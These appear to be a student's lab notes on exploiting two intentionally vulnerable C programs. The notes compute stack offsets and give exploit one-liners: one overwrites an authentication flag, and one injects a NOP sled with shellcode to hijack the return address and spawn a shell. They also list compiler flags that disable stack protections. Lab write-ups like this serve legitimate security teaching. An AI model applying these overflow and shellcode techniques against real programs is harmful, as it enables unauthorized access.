
1. Set up requirements, making sure gcc and stuff is already installed. 

Calculate your team_var[xx] size
xx = (team_member NUID % 512)
2590422 % 512 = 214


![[Pasted image 20260401093728.png]]

![[Pasted image 20260401093533.png]]

## Part 1 — login.c (Simple Overflow)

**Goal:** Get `auth_flag = 1` without knowing the password.

**Stack layout inside `check_authentication`:**

```
LOW ADDRESS
┌──────────────────┐ 0x7fffffffeaa0  ← username_buffer[16]
│ username_buffer  │
├──────────────────┤ 0x7fffffffeab0  ← team_var[333]
│    team_var      │
├──────────────────┤
│                  │
│   (333 bytes)    │
│                  │
├──────────────────┤ 0x7fffffffec0c  ← auth_flag (int)
│    auth_flag     │
└──────────────────┘
HIGH ADDRESS
```

**The math:**

```
0x7fffffffec0c - 0x7fffffffeaa0 = 364 bytes
```

So if you write 364 bytes into `username_buffer` (which only holds 16), you reach `auth_flag`. The 365th byte overwrites it with a non-zero value → access granted.


## Part 2 — extra.c (Shellcode Injection)

**Goal:** Spawn a shell even though the program doesn't call `system()`.

**Stack layout inside `main`:**

```
LOW ADDRESS
┌──────────────────┐ 0x7fffffffe8e0  ← password[256]
│    password      │
├──────────────────┤ 0x7fffffffe9e0  ← username[256]  ← YOU INJECT HERE
│    username      │
├──────────────────┤ 0x7fffffffeae0  ← team_var[333]
│    team_var      │
├──────────────────┤
│                  │
├──────────────────┤ 0x7fffffffec30  ← saved RBP
├──────────────────┤ 0x7fffffffec38  ← return address ← YOU OVERWRITE THIS
└──────────────────┘
HIGH ADDRESS
```

**The math:**

```
RBP - username_start = 0x7fffffffec30 - 0x7fffffffe9e0 = 0x250 = 592 bytes
```

**What goes into username:**

```
[NOP sled ~560 bytes][shellcode ~30 bytes][fake RBP 8 bytes][→ address inside NOP sled]
 ←————————— 592 bytes ————————————————→
```

**Why 592 bytes of NOP+shellcode?**

- That's exactly the gap from `username` start to `saved RBP`
- The shellcode must land **before** RBP — past it you're corrupting saved RBP and the return address (which you need to control cleanly)
- NOP sled fills the space so you can jump anywhere in it reliably

```
username starts at:  0x7fffffffe9e0
saved RBP is at:     0x7fffffffec30

Gap = 592 bytes  ← this is how far you write before you HIT saved RBP
```

So the layout is:

```
[NOP sled ~560 bytes][shellcode ~30 bytes] = 590 bytes of username buffer
                                              ↑
                                    you're still INSIDE username here

[fake RBP  8 bytes]   ← this IS the saved RBP slot (you're overwriting it now)
[return address    ]  ← this is what you actually care about (points into NOP sled)
```


**The exploit:**

bash

```bash
./extra `python -c "print('\x90'*560 + SHELLCODE + 'B'*8 + RETURN_ADDR)"` password
```

When `main` hits `ret`, it pops your fake return address into RIP, jumps into the NOP sled, slides down into shellcode → shell spawns.
**The exploit:**

bash

```bash
./login `python -c "print('A'*364 + '\x01')"` password
```.



**Step 1: Compile first**

bash

```bash
gcc -g -fno-stack-protector -z execstack -o login login.c
```

The flags matter:

- `-g` → include debug symbols (so gdb can see variable names)
- `-fno-stack-protector` → disable stack canary protection (lets overflow work)
- `-z execstack` → makes stack executable (needed for Part 2)

**Step 2: Then open gdb with the binary**

bash

```bash
gdb ./login
```













